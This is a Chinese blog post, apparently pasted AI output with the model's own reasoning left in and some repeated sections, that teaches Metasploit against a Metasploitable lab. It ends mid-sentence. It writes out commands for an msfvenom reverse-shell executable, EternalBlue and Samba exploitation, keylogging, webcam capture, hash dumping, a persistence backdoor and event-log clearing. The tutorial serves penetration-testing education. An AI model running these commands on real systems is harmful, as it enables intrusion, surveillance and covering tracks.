<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
    
    <link rel="icon" href="https://github.com/binghey/blog/blob/main/%E6%89%A7%E8%A1%8C%E5%90%88%E4%B8%80%E7%AC%94%E8%AE%B0.png?raw=true"><script>
        let theme = localStorage.getItem("meek_theme") || "light";
        document.documentElement.setAttribute("data-color-mode", theme);
    </script>
<meta name="description" content="好的，用户问的是“metasploit详细介绍”，首先得确定他的背景。">
<meta property="og:title" content="metasploit详细介绍-补充1">
<meta property="og:description" content="好的，用户问的是“metasploit详细介绍”，首先得确定他的背景。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://binghey.github.io/blog/post/metasploit-xiang-xi-jie-shao---bu-chong-1.html">
<meta property="og:image" content="https://github.com/binghey/blog/blob/main/%E6%89%A7%E8%A1%8C%E5%90%88%E4%B8%80%E7%AC%94%E8%AE%B0.png?raw=true">
<title>metasploit详细介绍-补充1</title>
<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />


</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">metasploit详细介绍-补充1</h1>
<div class="title-right">
    <a href="https://binghey.github.io/blog" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/binghey/blog/issues/15" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><p>好的，用户问的是“metasploit详细介绍”，首先得确定他的背景。可能是刚接触安全的新手，或者想找工具进行渗透测试？需要先理清Metasploit的核心结构，避免堆砌术语。</p>
<p>嗯，用户可能不只是要基本定义，而是想了解怎么用、能做什么。得拆分成框架构成、主要功能、使用场景这些部分。要注意区分社区版和专业版的区别，毕竟新手可能从免费版开始。</p>
<p>深层需求可能是想实际应用，比如学习渗透测试或者应对考试？得强调合法使用，避免误导。加上工作流程和例子，比如MS08-067的案例，能帮助理解操作步骤。</p>
<p>还要提醒法律风险，特别是提到Armitage和Veil时，避免用户误入歧途。最后总结学习路径，引导到正确资源，比如官方文档和道德规范。</p>
<p>好的，这是一份关于 Metasploit 的详细介绍。它将从基本概念讲起，逐步深入到核心组件、工作流程、使用场景和最佳实践。</p>
<p>好的，这是一份关于 Metasploit 的详细介绍。它将从基本概念讲起，逐步深入到核心组件、工作流程、使用场景和最佳实践。</p>
<hr>
<h3><strong>Metasploit 详细介绍</strong></h3>
<h4><strong>一、Metasploit 是什么？</strong></h4>
<p>Metasploit 是一个<strong>渗透测试框架</strong>，是目前全球最流行、最强大的网络安全工具之一。它不是一个单一的工具，而是一个集成了<strong>漏洞研究、漏洞验证和渗透测试</strong>功能的平台。</p>
<p>简单来说，Metasploit 是一个“<strong>漏洞武器库</strong>”和“<strong>攻击模拟平台</strong>”。安全人员（白帽子）可以用它来模拟真实世界中的黑客攻击，以此发现和验证系统漏洞，并评估这些漏洞可能带来的风险。</p>
<p><strong>开发与历史：</strong><br>
最初由 H.D. Moore 在 2003 年创建，后来被 Rapid7 公司收购。它从一个开源项目发展至今，拥有两个主要版本：</p>
<ul>
<li><strong>Metasploit Framework（社区版/专业版）</strong>： 核心命令行版本，免费且开源。</li>
<li><strong>Metasploit Pro（商业版）</strong>： 提供图形化界面和更高级的功能，如自动化渗透、高级渗透等。</li>
</ul>
<h4><strong>二、核心组件与架构</strong></h4>
<p>理解 Metasploit 的关键在于理解其模块化架构。所有功能都以“模块”的形式存在。</p>
<ol>
<li>
<p><strong>Modules（模块）</strong></p>
<ul>
<li><strong>Exploit（漏洞利用模块）</strong>
<ul>
<li>这是框架的核心。每个 Exploit 模块都针对一个特定的软件漏洞（如 <a title="CVE-2019-0708" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-fq64-gmq7-jjvg/hovercard" href="https://github.com/advisories/GHSA-fq64-gmq7-jjvg">CVE-2019-0708</a> “BlueKeep”）。</li>
<li>它的作用是利用漏洞，将程序的控制流劫持，为后续植入载荷做准备。</li>
</ul>
</li>
<li><strong>Payload（攻击载荷模块）</strong>
<ul>
<li>这是在成功利用漏洞后，在目标系统上运行的代码。</li>
<li>常见的 Payload 包括：
<ul>
<li><strong>反向 Shell</strong>： 让目标机器主动连接回攻击者的机器，建立一个命令行会话。</li>
<li><strong>Meterpreter</strong>： <strong>Metasploit 的招牌载荷</strong>，是一个高级、动态、可扩展的负载。它运行在内存中（无文件落地），提供了一套强大的命令行交互，可以执行文件操作、键盘记录、权限提升等。</li>
<li><strong>VNC Injection</strong>： 在目标机器上开启一个 VNC 远程桌面连接。</li>
</ul>
</li>
</ul>
</li>
<li><strong>Auxiliary（辅助模块）</strong>
<ul>
<li>这些模块不直接在目标上执行 Shell Code，而是用于执行信息收集、扫描、嗅探、模糊测试等辅助任务。</li>
<li>例如：端口扫描、服务版本探测、SNMP 信息枚举、密码爆破等。</li>
</ul>
</li>
<li><strong>Encoders（编码器）</strong>
<ul>
<li>用于对 Payload 进行编码，目的是<strong>逃避杀毒软件</strong>的检测。它通过改变 Payload 的签名来绕过特征码检查。</li>
<li><strong>注意</strong>： 在现代安全环境下，编码器的效果已大不如前，需要结合其他免杀技术。</li>
</ul>
</li>
<li><strong>NOP Generators（NOP 生成器）</strong>
<ul>
<li>在缓冲区溢出攻击中，NOP（空操作）指令用于提高 Exploit 的稳定性和成功率。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Tools（工具）</strong></p>
<ul>
<li><strong>MSFConsole</strong>
<ul>
<li><strong>这是最强大、最常用的 Metasploit 接口</strong>。它是一个交互式的命令行环境，集成了所有功能，支持选项卡补全、命令历史等，是渗透测试人员的主要操作界面。</li>
</ul>
</li>
<li><strong>MSFVenom</strong>
<ul>
<li>一个独立的 Payload 生成器。用于创建独立的、可执行的后门程序。</li>
<li><strong>典型用法</strong>： 生成一个 Windows 可执行文件（.exe），这个文件在运行时会产生一个反向 Meterpreter 连接。</li>
<li>命令示例：<code class="notranslate">msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe &gt; shell.exe</code></li>
</ul>
</li>
<li><strong>MSFDB</strong>
<ul>
<li>用于初始化和管理 PostgreSQL 数据库。使用数据库可以极大地提升工作效率，因为它能存储扫描结果、主机信息、凭证等，方便快速搜索和关联分析。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4><strong>三、基本工作流程</strong></h4>
<p>一次典型的 Metasploit 渗透测试遵循以下步骤：</p>
<ol>
<li>
<p><strong>信息收集</strong></p>
<ul>
<li>使用 <code class="notranslate">nmap</code>, <code class="notranslate">auxiliary/scanner/portscan/tcp</code> 等工具扫描目标，获取开放的端口、运行的服务、操作系统等信息。</li>
</ul>
</li>
<li>
<p><strong>漏洞分析</strong></p>
<ul>
<li>根据收集到的信息，判断目标可能存在的漏洞。</li>
<li>在 Metasploit 中搜索相关的 Exploit：<code class="notranslate">search [服务名或CVE编号]</code></li>
</ul>
</li>
<li>
<p><strong>漏洞利用</strong></p>
<ul>
<li>选择一个 Exploit：<code class="notranslate">use exploit/...</code></li>
<li>设置必要参数（如目标IP RHOSTS，端口 RPORT）：<code class="notranslate">set RHOSTS 192.168.1.100</code></li>
<li>选择一个 Payload：<code class="notranslate">set PAYLOAD windows/meterpreter/reverse_tcp</code></li>
<li>设置 Payload 参数（如攻击者IP LHOST，端口 LPORT）：<code class="notranslate">set LHOST 192.168.1.50</code></li>
<li>执行攻击：<code class="notranslate">exploit</code></li>
</ul>
</li>
<li>
<p><strong>权限提升</strong></p>
<ul>
<li>如果获取的 Shell 权限较低（如普通用户），使用 <code class="notranslate">getsystem</code> 或专门的提权模块（如 <code class="notranslate">exploit/windows/local/bypassuac</code>）来获取系统最高权限（SYSTEM/root）。</li>
</ul>
</li>
<li>
<p><strong>后渗透</strong></p>
<ul>
<li>这是 Meterpreter 大显身手的阶段。在目标系统上进行的深入操作，例如：
<ul>
<li><code class="notranslate">hashdump</code>： 导出密码哈希，可用于破解或“传递哈希”攻击。</li>
<li><code class="notranslate">screenshot</code>： 截取屏幕。</li>
<li><code class="notranslate">keyscan_start/keyscan_dump</code>： 键盘记录。</li>
<li><code class="notranslate">migrate</code>： 将 Meterpreter 进程迁移到一个更稳定的系统进程（如 <code class="notranslate">explorer.exe</code>）中。</li>
<li><code class="notranslate">persistence</code>： 创建持久化后门，保证在目标重启后仍能维持访问。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>清理痕迹</strong></p>
<ul>
<li>删除创建的文件、日志等，避免被检测到。（在授权的渗透测试中，有时客户会要求保留痕迹以评估其检测能力）。</li>
</ul>
</li>
</ol>
<h4><strong>四、使用场景</strong></h4>
<ul>
<li><strong>渗透测试</strong>： 核心用途，模拟黑客攻击以评估企业网络的安全性。</li>
<li><strong>漏洞研究与验证</strong>： 当一个新的漏洞（CVE）被披露时，安全研究员可以使用或编写对应的 Metasploit 模块来验证该漏洞的真实性和危害性。</li>
<li><strong>安全产品测试</strong>： 测试 IDS/IPS、防火墙、杀毒软件等安全产品的检测和防御能力。</li>
<li><strong>网络安全教学</strong>： 在受控的实验室环境（如 Kali Linux + Metasploitable VM）中，学习攻击技术和防御原理。</li>
</ul>
<h4><strong>五、重要注意事项与最佳实践</strong></h4>
<ol>
<li>
<p><strong>合法性！合法性！合法性！</strong></p>
<ul>
<li><strong>仅在您拥有明确书面授权的目标上使用 Metasploit</strong>。未经授权使用是违法行为。</li>
<li>建议在专属的虚拟实验室（如 VMware/VirtualBox）中进行学习和测试。</li>
</ul>
</li>
<li>
<p><strong>保持更新</strong></p>
<ul>
<li>Metasploit 社区非常活跃，每天都有新的模块被添加。定期运行 <code class="notranslate">msfupdate</code> 来获取最新的 Exploit 和功能。</li>
</ul>
</li>
<li>
<p><strong>理解原理，而非死记命令</strong></p>
<ul>
<li>Metasploit 自动化了攻击过程，但一个优秀的渗透测试师必须理解其背后的漏洞原理、利用技术和防御方法。</li>
</ul>
</li>
<li>
<p><strong>免杀（Antivirus Evasion）</strong></p>
<ul>
<li>默认生成的 Payload 很容易被现代杀毒软件检测到。需要结合编码、加壳、密码器或自定义编写等技术来绕过检测。</li>
</ul>
</li>
<li>
<p><strong>与其它工具结合</strong></p>
<ul>
<li>Metasploit 可以很好地与 Nmap、Nessus、Burp Suite 等其他安全工具配合使用，形成一个完整的工作流。</li>
</ul>
</li>
</ol>
<h4><strong>六、总结</strong></h4>
<p>Metasploit 是一个改变了网络安全游戏规则的框架。它将复杂的漏洞利用过程标准化、模块化，极大地降低了渗透测试的门槛，同时也提高了效率。对于安全专业人员来说，它是<strong>必备的技能和工具</strong>；对于组织而言，它是衡量自身防御能力的“试金石”。</p>
<p><strong>记住：能力越大，责任越大。务必在法律和道德的框架内使用它。</strong></p>
<p>由于Metasploit是一个庞大的框架，详细教程可以写一本书。这里我将提供一个结构化的详细教程大纲，并附上一些基本命令和示例，帮助你快速上手。</p>
<p>Metasploit 详细教程</p>
<ol>
<li>安装与配置<br>
1.1 安装<br>
Metasploit通常预装在Kali Linux中。如果你使用其他系统，可以从官方下载或使用如下方式安装：</li>
</ol>
<p>在Kali Linux中更新：</p>
<p>bash<br>
sudo apt update &amp;&amp; sudo apt install metasploit-framework<br>
在Ubuntu/Debian上安装：</p>
<p>bash<br>
curl <a href="https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb" rel="nofollow">https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb</a> &gt; msfinstall<br>
chmod +x msfinstall<br>
./msfinstall<br>
1.2 初始化数据库<br>
Metasploit使用数据库来存储工作数据，使搜索和管理更高效。</p>
<p>bash</p>
<h1>启动PostgreSQL服务（Kali默认已安装）</h1>
<p>sudo systemctl start postgresql</p>
<h1>初始化数据库</h1>
<p>msfdb init<br>
1.3 启动Metasploit<br>
bash<br>
msfconsole<br>
在msfconsole中，可以检查数据库连接状态：</p>
<p>msf<br>
db_status<br>
2. 基本命令与导航<br>
2.1 帮助命令<br>
在msfconsole中，可以使用help查看所有命令。</p>
<p>2.2 搜索模块<br>
使用search命令查找模块：</p>
<p>msf<br>
search [keyword]<br>
例如，搜索SMB相关的漏洞：</p>
<p>msf<br>
search smb<br>
可以使用多个条件，如：</p>
<p>msf<br>
search type:exploit platform:windows smb<br>
2.3 使用模块<br>
使用use命令来选择一个模块：</p>
<p>msf<br>
use [module_path]<br>
例如：</p>
<p>msf<br>
use exploit/windows/smb/ms17_010_eternalblue<br>
2.4 显示模块信息<br>
使用info命令查看模块的详细信息，包括描述、选项、引用等。</p>
<p>2.5 设置模块选项<br>
使用show options查看需要设置的选项。<br>
使用set命令设置选项：</p>
<p>msf<br>
set RHOSTS 192.168.1.100<br>
使用setg命令设置全局选项，这样在其他模块中也会使用这个值。</p>
<p>2.6 运行模块<br>
使用exploit或run命令来运行模块。exploit -z在攻击成功后将会话放入后台。</p>
<ol start="3">
<li>信息收集<br>
在渗透测试中，信息收集是第一步。Metasploit提供了很多辅助模块。</li>
</ol>
<p>3.1 端口扫描<br>
msf<br>
use auxiliary/scanner/portscan/tcp<br>
set RHOSTS 192.168.1.0/24<br>
set PORTS 1-1000<br>
run<br>
3.2 SMB版本扫描<br>
msf<br>
use auxiliary/scanner/smb/smb_version<br>
set RHOSTS 192.168.1.100<br>
run<br>
4. 漏洞利用<br>
4.1 选择并配置Exploit<br>
以EternalBlue为例：</p>
<p>msf<br>
use exploit/windows/smb/ms17_010_eternalblue<br>
set RHOSTS 192.168.1.100<br>
4.2 选择Payload<br>
Payload是在目标上执行的代码。使用show payloads查看可用的Payload。<br>
设置Payload：</p>
<p>msf<br>
set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>
然后需要设置Payload的选项（如LHOST、LPORT）：</p>
<p>msf<br>
set LHOST 192.168.1.50  # 你的IP<br>
set LPORT 4444<br>
4.3 执行<br>
msf<br>
exploit<br>
5. 后渗透阶段<br>
一旦获得Meterpreter会话，就可以进行后渗透。</p>
<p>5.1 Meterpreter基本命令<br>
sysinfo：查看系统信息。</p>
<p>getuid：查看当前用户。</p>
<p>shell：进入命令行 shell。</p>
<p>upload / download：上传/下载文件。</p>
<p>5.2 权限提升<br>
使用getsystem命令尝试提权。</p>
<p>5.3 持久化<br>
使用persistence模块在目标上安装后门。</p>
<ol start="6">
<li>
<p>报告<br>
使用notes命令添加注释，使用db_export导出数据。</p>
</li>
<li>
<p>实例：攻击Windows 7（EternalBlue）<br>
假设目标IP为192.168.1.100，攻击者IP为192.168.1.50。</p>
</li>
</ol>
<p>启动msfconsole。</p>
<p>搜索EternalBlue模块：</p>
<p>msf<br>
search eternalblue<br>
使用该模块并设置目标：</p>
<p>msf<br>
use exploit/windows/smb/ms17_010_eternalblue<br>
set RHOSTS 192.168.1.100<br>
设置Payload和监听IP与端口：</p>
<p>msf<br>
set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>
set LHOST 192.168.1.50<br>
set LPORT 4444<br>
执行攻击：</p>
<p>msf<br>
exploit<br>
成功后，你将会得到一个Meterpreter会话。可以执行后渗透命令。</p>
<ol start="8">
<li>总结<br>
这只是一个简单的入门教程。Metasploit功能非常强大，建议在合法的环境中多加练习，并参考官方文档和高级教程。</li>
</ol>
<p>注意：务必在授权的情况下进行测试。</p>
<p>好的，这是一份从零开始的 Metasploit 详细实战教程。我们将通过一个完整的、在虚拟机环境中模拟的渗透测试过程，来学习 Metasploit 的核心用法。</p>
<p>好的，这是一份从零开始的 Metasploit <strong>详细实战教程</strong>。我们将通过一个完整的、在虚拟机环境中模拟的渗透测试过程，来学习 Metasploit 的核心用法。</p>
<hr>
<h3><strong>Metasploit 详细实战教程</strong></h3>
<h4><strong>第一步：环境准备与基本概念</strong></h4>
<p><strong>1. 实验环境搭建：</strong></p>
<ul>
<li><strong>攻击机 (Attacker)：</strong> 推荐使用 <strong>Kali Linux</strong>。它预装了完整的 Metasploit 框架及其他渗透测试工具。</li>
<li><strong>目标机 (Target)：</strong> 推荐使用 <strong>Metasploitable 2/3</strong>。这是一个故意配置了多种漏洞的 Ubuntu Linux 虚拟机，专门用于安全练习。</li>
<li><strong>网络：</strong> 确保两台虚拟机处于同一网络模式（如 NAT 或 Host-Only），可以互相 ping 通。</li>
</ul>
<p><strong>2. 启动 Metasploit：</strong><br>
在 Kali Linux 终端中，输入以下命令启动 Metasploit 的控制台：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">sudo msfconsole</pre></div>
<p>启动后，你会看到一个命令行提示符变为 <code class="notranslate">msf6 &gt;</code>，这表示你已经进入了 Metasploit 的世界。</p>
<p><strong>3. 核心命令初识：</strong><br>
在开始前，先记住这几个最常用的命令：</p>
<ul>
<li><code class="notranslate">help</code>： 查看所有可用命令。</li>
<li><code class="notranslate">search</code>： 搜索模块。</li>
<li><code class="notranslate">use</code>： 使用一个模块。</li>
<li><code class="notranslate">show options</code>： 显示模块需要设置的参数。</li>
<li><code class="notranslate">set</code>： 设置参数值。</li>
<li><code class="notranslate">exploit</code> 或 <code class="notranslate">run</code>： 执行模块。</li>
</ul>
<hr>
<h4><strong>第二步：信息收集 - 发现目标弱点</strong></h4>
<p>在攻击之前，我们必须先了解目标。假设我们不知道目标机（Metasploitable 2， IP: 192.168.1.105）的任何信息。</p>
<p><strong>1. 使用 Nmap 扫描：</strong><br>
在 <code class="notranslate">msfconsole</code> 中，你可以直接使用 <code class="notranslate">db_nmap</code> 命令，它会将扫描结果自动存入 Metasploit 的数据库中。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在 msfconsole 中执行</span>
db_nmap -sV -O 192.168.1.105</pre></div>
<ul>
<li><code class="notranslate">-sV</code>： 探测服务版本。</li>
<li><code class="notranslate">-O</code>： 探测操作系统。</li>
</ul>
<p>扫描结束后，你会发现目标开放了很多端口，如 21 (FTP), 22 (SSH), 80 (HTTP), 445 (SMB) 等，并且服务版本都比较老旧，存在漏洞。</p>
<p><strong>2. 使用 Metasploit 辅助模块进行深度扫描：</strong><br>
例如，我们想详细扫描 SMB 服务。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 搜索 SMB 相关的扫描模块</span>
search smb_version

<span class="pl-c"><span class="pl-c">#</span> 使用找到的辅助模块</span>
use auxiliary/scanner/smb/smb_version

<span class="pl-c"><span class="pl-c">#</span> 查看需要设置的参数</span>
show options

<span class="pl-c"><span class="pl-c">#</span> 设置目标IP (RHOSTS 可以是单个IP，也可以是IP段)</span>
<span class="pl-c1">set</span> RHOSTS 192.168.1.105

<span class="pl-c"><span class="pl-c">#</span> 运行扫描</span>
run</pre></div>
<p>扫描结果会确认目标运行的是旧版的 Samba 服务，这通常存在著名漏洞。</p>
<hr>
<h4><strong>第三步：漏洞利用 - 发起攻击</strong></h4>
<p>我们以 Metasploitable 2 中一个经典的 "Samba <code class="notranslate">usermap_script</code>" 漏洞为例。</p>
<p><strong>1. 搜索并选择漏洞利用模块：</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 搜索该漏洞</span>
search usermap_script

<span class="pl-c"><span class="pl-c">#</span> 使用该漏洞利用模块</span>
use exploit/multi/samba/usermap_script</pre></div>
<p><strong>2. 查看并设置参数：</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 查看需要设置的选项</span>
show options</pre></div>
<p>你会看到需要设置的参数，最重要的是：</p>
<ul>
<li><code class="notranslate">RHOSTS</code>： 目标机器的IP地址。</li>
<li><code class="notranslate">RPORT</code>： 目标服务的端口（默认是445，这里不用改）。</li>
</ul>
<p><strong>3. 设置攻击载荷 (Payload)：</strong><br>
Payload 是攻击成功后你想要在目标机器上执行的操作。我们选择最强大的 <strong>Meterpreter</strong>。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 查看可用的Payload</span>
show payloads

<span class="pl-c"><span class="pl-c">#</span> 选择一个兼容的 Meterpreter Payload</span>
<span class="pl-c1">set</span> PAYLOAD cmd/unix/reverse_netcat</pre></div>
<p><em>注意：因为这个漏洞比较特殊，它直接给我们一个 root shell，所以我们选择一个简单的反向 shell Payload。对于大多数 Windows 漏洞，你会选择像 <code class="notranslate">windows/meterpreter/reverse_tcp</code> 这样的 Payload。</em></p>
<p><strong>4. 设置必要参数并发动攻击：</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 设置目标IP</span>
<span class="pl-c1">set</span> RHOSTS 192.168.1.105

<span class="pl-c"><span class="pl-c">#</span> 设置攻击者IP (LHOST)，即你的Kali Linux的IP</span>
<span class="pl-c1">set</span> LHOST 192.168.1.104

<span class="pl-c"><span class="pl-c">#</span> 最后，发动攻击！</span>
exploit</pre></div>
<p>如果一切顺利，你会看到 <code class="notranslate">Command shell session 1 opened</code> 的提示，并且命令行变成了 <code class="notranslate">$</code> 或 <code class="notranslate">#</code>，这意味着你已经成功获取了目标机的一个 <strong>Shell</strong>！而且由于这个漏洞，你直接获得了 <strong>root 权限</strong> (<code class="notranslate">#</code>)。</p>
<hr>
<h4><strong>第四步：后渗透 - 深入探索与控制</strong></h4>
<p>现在你已经进入了目标系统。让我们看看能做什么。</p>
<p><strong>在基础的 Shell 中：</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 查看当前用户</span>
whoami

<span class="pl-c"><span class="pl-c">#</span> 查看系统信息</span>
uname -a

<span class="pl-c"><span class="pl-c">#</span> 查看网络配置</span>
ifconfig

<span class="pl-c"><span class="pl-c">#</span> 浏览文件系统</span>
ls
<span class="pl-c1">cd</span> /etc
cat passwd</pre></div>
<p>这个 Shell 功能有限。如果我们用的是 Meterpreter，那会强大得多。让我们模拟一个更常见的场景，假设我们通过另一个漏洞进入了 Meterpreter。</p>
<p><strong>（模拟）在 Meterpreter 会话中：</strong><br>
如果你有一个 Meterpreter 会话（提示符为 <code class="notranslate">meterpreter &gt;</code>），你可以做很多事情：</p>
<ol>
<li>
<p><strong>基本系统命令：</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">sysinfo          <span class="pl-c"><span class="pl-c">#</span> 查看系统信息</span>
getuid           <span class="pl-c"><span class="pl-c">#</span> 查看当前权限</span>
<span class="pl-c1">pwd</span>              <span class="pl-c"><span class="pl-c">#</span> 查看当前目录</span>
ls               <span class="pl-c"><span class="pl-c">#</span> 列出文件</span></pre></div>
</li>
<li>
<p><strong>权限提升：</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">getsystem        <span class="pl-c"><span class="pl-c">#</span> 尝试自动提权到 SYSTEM</span></pre></div>
</li>
<li>
<p><strong>文件系统操作：</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">download /etc/passwd /tmp/  <span class="pl-c"><span class="pl-c">#</span> 从目标下载文件到攻击机</span>
upload /usr/share/windows-binaries/nc.exe C:<span class="pl-cce">\\</span>  <span class="pl-c"><span class="pl-c">#</span> 上传文件到目标</span></pre></div>
</li>
<li>
<p><strong>信息收集：</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">hashdump         <span class="pl-c"><span class="pl-c">#</span> 抓取密码哈希值（需要 SYSTEM 权限）</span>
screenshot       <span class="pl-c"><span class="pl-c">#</span> 截取目标屏幕</span>
webcam_snap      <span class="pl-c"><span class="pl-c">#</span> 从摄像头拍照</span>
keyscan_start    <span class="pl-c"><span class="pl-c">#</span> 开始键盘记录</span>
keyscan_dump     <span class="pl-c"><span class="pl-c">#</span> 导出记录到的按键</span>
keyscan_stop     <span class="pl-c"><span class="pl-c">#</span> 停止键盘记录</span></pre></div>
</li>
<li>
<p><strong>持久化：</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">run persistence -X -i 5 -p 4444 -r 192.168.1.104
<span class="pl-c"><span class="pl-c">#</span> -X： 系统启动时自启动</span>
<span class="pl-c"><span class="pl-c">#</span> -i： 回连间隔（秒）</span>
<span class="pl-c"><span class="pl-c">#</span> -p： 回连端口</span>
<span class="pl-c"><span class="pl-c">#</span> -r： 攻击者IP</span></pre></div>
</li>
</ol>
<p><strong>会话管理：</strong></p>
<ul>
<li>在 Meterpreter 或 Shell 中，输入 <code class="notranslate">background</code> 可以将会话放入后台，你会回到 <code class="notranslate">msf6 &gt;</code> 提示符。</li>
<li>使用 <code class="notranslate">sessions</code> 命令查看所有存在的会话。</li>
<li>使用 <code class="notranslate">sessions -i [id]</code> 重新进入某个会话（例如 <code class="notranslate">sessions -i 1</code>）。</li>
</ul>
<hr>
<h4><strong>第五步：清理痕迹与总结</strong></h4>
<p><strong>1. 清理痕迹：</strong><br>
在授权的渗透测试中，根据客户要求，可能需要清理日志和后门。</p>
<ul>
<li>在 Meterpreter 中，使用 <code class="notranslate">clearev</code> 命令清除 Windows 事件日志。</li>
<li>手动删除上传的工具和创建的持久化脚本。</li>
</ul>
<p><strong>2. 退出 Metasploit：</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">exit</span></pre></div>
<p>系统会问你是否要终止所有会话，确认即可。</p>
<hr>
<h3><strong>总结与工作流</strong></h3>
<p>一次完整的 Metasploit 渗透测试流程可以总结为：</p>
<ol>
<li><strong>启动 &amp; 数据库初始化</strong>： <code class="notranslate">msfconsole</code>, <code class="notranslate">db_status</code></li>
<li><strong>信息收集</strong>： <code class="notranslate">db_nmap</code>, 辅助模块 (<code class="notranslate">auxiliary/scanner/...</code>)</li>
<li><strong>漏洞分析 &amp; 选择</strong>： <code class="notranslate">search</code>, <code class="notranslate">info</code></li>
<li><strong>配置与攻击</strong>：
<ul>
<li><code class="notranslate">use [exploit_path]</code></li>
<li><code class="notranslate">show options</code></li>
<li><code class="notranslate">set RHOSTS [target_ip]</code></li>
<li><code class="notranslate">set PAYLOAD [payload_name]</code></li>
<li><code class="notranslate">set LHOST [your_ip]</code></li>
<li><code class="notranslate">exploit</code></li>
</ul>
</li>
<li><strong>后渗透</strong>：
<ul>
<li>在 <code class="notranslate">meterpreter</code> 或 <code class="notranslate">shell</code> 中操作。</li>
<li><code class="notranslate">background</code> 会话。</li>
<li>使用其他后渗透模块 (<code class="notranslate">use post/...</code>)。</li>
</ul>
</li>
<li><strong>报告 &amp; 清理</strong>： 记录发现，清理痕迹，退出。</li>
</ol>
<p><strong>重要提醒：</strong></p>
<ul>
<li><strong>永远在你有合法授权的目标上练习！</strong></li>
<li>这个教程只是一个起点。Metasploit 有数百个模块，每个都有其特定的用途和设置。</li>
<li>不断练习，阅读官方文档，并尝试在像 TryHackMe 或 HackTheBox 这样的合法平台上进行练习，是掌握 Metasploit 的最佳途径。</li>
</ul>
<p>手机场景高级玩法</p>
<p>由于手机环境（如Android）与传统的计算机环境不同，在手机上使用Metasploit通常有两种情况：</p>
<p>在手机上安装Metasploit（作为攻击机）</p>
<p>针对手机系统（如Android）进行渗透测试（作为目标）</p>
<p>但是，由于手机资源限制和系统差异，在手机上运行Metasploit可能不如在PC上顺畅。不过，有一些方法可以在手机上实现高级玩法。</p>
<p>注意：以下内容仅用于安全研究和学习，请勿用于非法活动。</p>
<p>一、在手机上安装Metasploit（以Android为例）</p>
<p>方法1：使用Termux<br>
Termux是一个Android终端模拟器和Linux环境应用程序。通过Termux，我们可以在Android上安装Metasploit。</p>
<p>步骤：</p>
<p>从F-Droid商店安装Termux。</p>
<p>更新包：pkg update &amp;&amp; pkg upgrade</p>
<p>安装必要的包：pkg install wget curl git ruby</p>
<p>下载Metasploit安装脚本（注意：由于Metasploit较大，且ARM架构兼容性问题，可能需要使用特定版本的安装脚本）。</p>
<p>运行安装脚本（例如，来自TrustedSec的安装脚本）：<br>
